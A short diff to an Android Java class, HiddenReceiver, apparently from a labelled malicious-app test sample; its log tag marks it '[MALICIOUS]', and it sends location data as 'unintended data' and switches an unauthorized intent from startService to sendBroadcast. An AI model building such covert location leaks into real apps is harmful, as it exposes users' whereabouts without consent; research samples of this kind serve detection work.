@@ -26,7 +26,7 @@ public class HiddenReceiver {
 
 					Log.d("[MALICIOUS][Hidden Receiver]", "Send unintended data " + locationData);
 					
-					context.startService(unauthorizedBehavior);
+					context.sendBroadcast(unauthorizedBehavior);
 				}
 			}
 		};
